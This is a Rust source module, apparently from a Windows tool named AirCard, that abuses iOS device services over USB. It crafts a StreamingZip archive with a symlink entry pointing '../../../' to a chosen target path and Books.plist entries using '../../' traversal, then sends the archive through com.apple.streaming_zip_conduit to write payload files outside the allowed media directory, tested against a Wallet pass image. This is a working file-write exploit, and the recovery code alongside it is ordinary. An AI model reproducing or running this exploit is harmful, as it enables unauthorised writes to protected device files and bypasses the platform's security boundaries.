use std::collections::HashMap;
use std::io::Write;
use std::time::Duration;

use anyhow::{Context, Result, bail};

use crate::afc::AfcClient;
use crate::service_protocol::{receive_plist, send_plist};
use crate::wallet_connection::DeviceSession;

pub const SOURCE_PREFIX: &str = "airlift-src-";
pub const LINK_PREFIX: &str = "airlift-link-";
pub const RECOVERED_PREFIX: &str = "airlift-recovered-";

pub const TRACKED_BOOKS_FILES: &[&str] = &[
    "Books/Books.plist",
    "Books/Sync/Books.plist",
    "Books/Sync/Upload.plist",
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
];

const SZ_EXTRA_ID: u16 = 0x5A53;

// Unix file mode constants
const S_IFDIR: u32 = 0o040000;
const S_IFREG: u32 = 0o100000;
const S_IFLNK: u32 = 0o120000;

struct StoredZipEntry {
    name: String,
    mode: u32,
    data: Vec<u8>,
}

fn crc32_simple(data: &[u8]) -> u32 {
    let mut crc = 0xFFFFFFFFu32;
    for &b in data {
        crc ^= b as u32;
        for _ in 0..8 {
            if (crc & 1) != 0 {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    !crc
}

#[allow(dead_code)]
pub fn build_streaming_zip_archive(target: &str, payload: &[u8]) -> Result<Vec<u8>> {
    build_streaming_zip_archive_multi(target, &[("payload", payload)])
}

pub fn build_streaming_zip_archive_multi(target: &str, items: &[(&str, &[u8])]) -> Result<Vec<u8>> {
    let target_tail = target.strip_prefix('/').unwrap_or(target);

    let mut metadata_plist = Vec::new();
    let mut meta_dict = HashMap::new();
    meta_dict.insert("Version".to_string(), plist::Value::Integer(2.into()));
    plist::to_writer_binary(
        &mut metadata_plist,
        &plist::Value::Dictionary(meta_dict.into_iter().collect()),
    )
    .context("Failed to encode ZipMetadata.plist")?;

    let mut entries = Vec::new();

    // META-INF/ (dir 0755)
    entries.push(StoredZipEntry {
        name: "META-INF/".to_string(),
        mode: S_IFDIR | 0o755,
        data: Vec::new(),
    });

    // META-INF/com.apple.ZipMetadata.plist (reg 0600)
    entries.push(StoredZipEntry {
        name: "META-INF/com.apple.ZipMetadata.plist".to_string(),
        mode: S_IFREG | 0o600,
        data: metadata_plist,
    });

    // p0/, p0/p1/, p0/p1/p2/ (dir 0755)
    for dir in &["p0/", "p0/p1/", "p0/p1/p2/"] {
        entries.push(StoredZipEntry {
            name: dir.to_string(),
            mode: S_IFDIR | 0o755,
            data: Vec::new(),
        });
    }

    // p0/p1/p2/link (symlink 0777)
    let symlink_target = format!("../../../{}", target_tail);
    entries.push(StoredZipEntry {
        name: "p0/p1/p2/link".to_string(),
        mode: S_IFLNK | 0o777,
        data: symlink_target.into_bytes(),
    });

    // Intermediary directories of target_tail (0755)
    let mut cursor = String::new();
    for component in target_tail.split('/') {
        if component.is_empty() {
            continue;
        }
        cursor.push_str(component);
        cursor.push('/');
        entries.push(StoredZipEntry {
            name: cursor.clone(),
            mode: S_IFDIR | 0o755,
            data: Vec::new(),
        });
    }

    // Payloads (reg 0600)
    if items.len() == 1 && items[0].0 == "payload" {
        entries.push(StoredZipEntry {
            name: "payload".to_string(),
            mode: S_IFREG | 0o600,
            data: items[0].1.to_vec(),
        });
    } else {
        for (idx, (_leaf, payload)) in items.iter().enumerate() {
            entries.push(StoredZipEntry {
                name: format!("payload_{}", idx),
                mode: S_IFREG | 0o600,
                data: payload.to_vec(),
            });
        }
        if !items.is_empty() {
            entries.push(StoredZipEntry {
                name: "payload".to_string(),
                mode: S_IFREG | 0o600,
                data: items[0].1.to_vec(),
            });
        }
    }

    // Pack into stored zip with Apple StreamingZip Unix metadata
    let mut output = Vec::new();
    let mut cd_entries = Vec::new();

    for entry in entries {
        let offset = output.len() as u32;
        let crc = crc32_simple(&entry.data);
        let name_bytes = entry.name.as_bytes();
        let name_len = name_bytes.len() as u16;

        let extra_mode = (entry.mode & 0xFFFF) as u16;
        let mut extra = Vec::new();
        extra.extend_from_slice(&SZ_EXTRA_ID.to_le_bytes());
        extra.extend_from_slice(&2u16.to_le_bytes());
        extra.extend_from_slice(&extra_mode.to_le_bytes());
        let extra_len = extra.len() as u16;

        // Local header (0x04034b50)
        output.extend_from_slice(&0x04034b50u32.to_le_bytes());
        output.extend_from_slice(&20u16.to_le_bytes()); // version needed
        output.extend_from_slice(&0u16.to_le_bytes()); // flags
        output.extend_from_slice(&0u16.to_le_bytes()); // compression = stored (0)
        output.extend_from_slice(&0x2800u16.to_le_bytes()); // mod time
        output.extend_from_slice(&0x5D30u16.to_le_bytes()); // mod date
        output.extend_from_slice(&crc.to_le_bytes());
        output.extend_from_slice(&(entry.data.len() as u32).to_le_bytes()); // compressed size
        output.extend_from_slice(&(entry.data.len() as u32).to_le_bytes()); // uncompressed size
        output.extend_from_slice(&name_len.to_le_bytes());
        output.extend_from_slice(&extra_len.to_le_bytes());
        output.extend_from_slice(name_bytes);
        output.extend_from_slice(&extra);
        output.extend_from_slice(&entry.data);

        cd_entries.push((
            entry.name,
            entry.mode,
            crc,
            entry.data.len() as u32,
            offset,
            extra,
        ));
    }

    let cd_start = output.len() as u32;
    for (name, mode, crc, len, offset, extra) in &cd_entries {
        let name_bytes = name.as_bytes();
        let name_len = name_bytes.len() as u16;
        let extra_len = extra.len() as u16;
        let ext_attr = (mode & 0xFFFF) << 16;

        // Central directory header (0x02014b50)
        output.extend_from_slice(&0x02014b50u32.to_le_bytes());
        output.extend_from_slice(&((3u16 << 8) | 20u16).to_le_bytes()); // version made by = Unix (3), 2.0
        output.extend_from_slice(&20u16.to_le_bytes()); // version needed
        output.extend_from_slice(&0u16.to_le_bytes()); // flags
        output.extend_from_slice(&0u16.to_le_bytes()); // compression = 0
        output.extend_from_slice(&0x2800u16.to_le_bytes()); // time
        output.extend_from_slice(&0x5D30u16.to_le_bytes()); // date
        output.extend_from_slice(&crc.to_le_bytes());
        output.extend_from_slice(&len.to_le_bytes()); // compressed
        output.extend_from_slice(&len.to_le_bytes()); // uncompressed
        output.extend_from_slice(&name_len.to_le_bytes());
        output.extend_from_slice(&extra_len.to_le_bytes());
        output.extend_from_slice(&0u16.to_le_bytes()); // comment len
        output.extend_from_slice(&0u16.to_le_bytes()); // disk start
        output.extend_from_slice(&0u16.to_le_bytes()); // internal attr
        output.extend_from_slice(&ext_attr.to_le_bytes()); // external attr
        output.extend_from_slice(&offset.to_le_bytes());
        output.extend_from_slice(name_bytes);
        output.extend_from_slice(&extra);
    }

    let cd_len = (output.len() as u32) - cd_start;
    let entry_count = cd_entries.len() as u16;

    // End of central directory record (0x06054b50)
    output.extend_from_slice(&0x06054b50u32.to_le_bytes());
    output.extend_from_slice(&0u16.to_le_bytes()); // disk num
    output.extend_from_slice(&0u16.to_le_bytes()); // start disk
    output.extend_from_slice(&entry_count.to_le_bytes()); // entries on this disk
    output.extend_from_slice(&entry_count.to_le_bytes()); // total entries
    output.extend_from_slice(&cd_len.to_le_bytes());
    output.extend_from_slice(&cd_start.to_le_bytes());
    output.extend_from_slice(&0u16.to_le_bytes()); // comment len

    Ok(output)
}

pub fn build_books_plist(identifiers: &[String]) -> Result<Vec<u8>> {
    let mut rows = Vec::new();
    for (idx, ident) in identifiers.iter().enumerate() {
        let mut row = HashMap::new();
        row.insert(
            "Persistent ID".to_string(),
            plist::Value::String(ident.clone()),
        );
        row.insert(
            "Item ID".to_string(),
            plist::Value::String((idx + 1).to_string()),
        );
        row.insert("DSID".to_string(), plist::Value::String("1".to_string()));
        rows.push(plist::Value::Dictionary(row.into_iter().collect()));
    }

    let mut root = HashMap::new();
    root.insert("Books".to_string(), plist::Value::Array(rows));

    let mut buffer = Vec::new();
    plist::to_writer_binary(
        &mut buffer,
        &plist::Value::Dictionary(root.into_iter().collect()),
    )
    .context("Failed to serialize Books.plist")?;
    Ok(buffer)
}

pub struct BooksSnapshot {
    pub files: HashMap<String, Option<Vec<u8>>>,
}

pub fn snapshot_books(afc: &AfcClient) -> Result<BooksSnapshot> {
    let mut files = HashMap::new();
    for &path in TRACKED_BOOKS_FILES {
        if afc.try_exists(path)? {
            let data = afc
                .read_file(path)
                .context(format!("Failed to read Books file: {}", path))?;
            files.insert(path.to_string(), Some(data));
        } else {
            files.insert(path.to_string(), None);
        }
    }
    Ok(BooksSnapshot { files })
}

pub fn save_recovery(snapshot: &BooksSnapshot, udid: &str) -> Result<std::path::PathBuf> {
    let root = std::env::var_os("LOCALAPPDATA").context("LOCALAPPDATA missing")?;
    let dir = std::path::PathBuf::from(root)
        .join("AirCard")
        .join("recovery")
        .join(uuid::Uuid::new_v4().to_string());
    std::fs::create_dir_all(&dir)?;
    let mut values = plist::Dictionary::new();
    for (name, data) in &snapshot.files {
        values.insert(
            name.clone(),
            data.as_ref()
                .map(|d| plist::Value::Data(d.clone()))
                .unwrap_or(plist::Value::Boolean(false)),
        );
    }
    values.insert("DeviceUDID".into(), plist::Value::String(udid.into()));
    let path = dir.join("Books-before-write.plist");
    let mut file = std::fs::File::create(&path)?;
    plist::Value::Dictionary(values).to_writer_binary(&mut file)?;
    file.sync_all()?;
    Ok(path)
}

pub fn restore_books(afc: &AfcClient, snapshot: &BooksSnapshot) -> Result<()> {
    let mut errors = Vec::new();
    for (path, data_opt) in &snapshot.files {
        match data_opt {
            Some(data) => {
                if let Some(parent) = path.rfind('/').map(|i| &path[..i]) {
                    let _ = afc.make_directory_recursive(parent);
                }
                if let Err(e) = afc.write_file(path, data) {
                    errors.push(format!("Restore write failed for {}: {}", path, e));
                }
            }
            None => {
                if afc.try_exists(path)? {
                    if let Err(e) = afc.remove_path(path) {
                        errors.push(format!("Restore removal failed for {}: {}", path, e));
                    }
                }
            }
        }
    }

    if !errors.is_empty() {
        bail!("Books restore had errors: {}", errors.join("; "));
    }
    Ok(())
}

pub fn stage_streaming_zip(
    session: &mut DeviceSession,
    source_subdir: &str,
    archive: &[u8],
) -> Result<()> {
    let mut stream = session.start_service("com.apple.streaming_zip_conduit")?;
    stream.set_timeout(Duration::from_secs(25))?;
    let request = crate::usbmux::dict([("MediaSubdir", crate::usbmux::string(source_subdir))]);
    send_plist(&mut stream, &request, false)?;
    for chunk in archive.chunks(65536) {
        stream.write_all(chunk)?;
    }
    stream.flush()?;
    let response = receive_plist(&mut stream, false)?;
    if let Some(error) = response.as_dictionary().and_then(|d| d.get("Error")) {
        bail!("StreamingZip rejected archive: {error:?}");
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_streaming_zip_archive() {
        let payload = b"test-wallet-payload-png";
        let archive = build_streaming_zip_archive(
            "/var/mobile/Library/Passes/Cards/abc.pkpass/cardBackgroundCombined@2x.png",
            payload,
        )
        .expect("build streaming zip should succeed");

        assert!(!archive.is_empty());
        // Verify local file header signature 0x04034b50
        assert_eq!(&archive[0..4], &[0x50, 0x4b, 0x03, 0x04]);

        // Verify that SZ_EXTRA_ID 0x5A53 is in the archive
        let has_extra = archive.windows(2).any(|w| w == &[0x53, 0x5a]);
        assert!(
            has_extra,
            "Must contain Apple StreamingZip extra field 0x5A53"
        );
    }

    #[test]
    fn test_build_books_plist() {
        let idents = vec![
            "../../airlift-src-token/p0/p1/p2/link".to_string(),
            "../../airlift-src-token/payload".to_string(),
        ];
        let plist_bytes = build_books_plist(&idents).expect("build books plist should succeed");
        assert!(!plist_bytes.is_empty());

        let value = plist::Value::from_reader(std::io::Cursor::new(plist_bytes))
            .expect("should deserialize binary plist");
        let dict = value.as_dictionary().expect("root must be dictionary");
        let books = dict
            .get("Books")
            .and_then(|v| v.as_array())
            .expect("Books must be array");
        assert_eq!(books.len(), 2);
    }
}
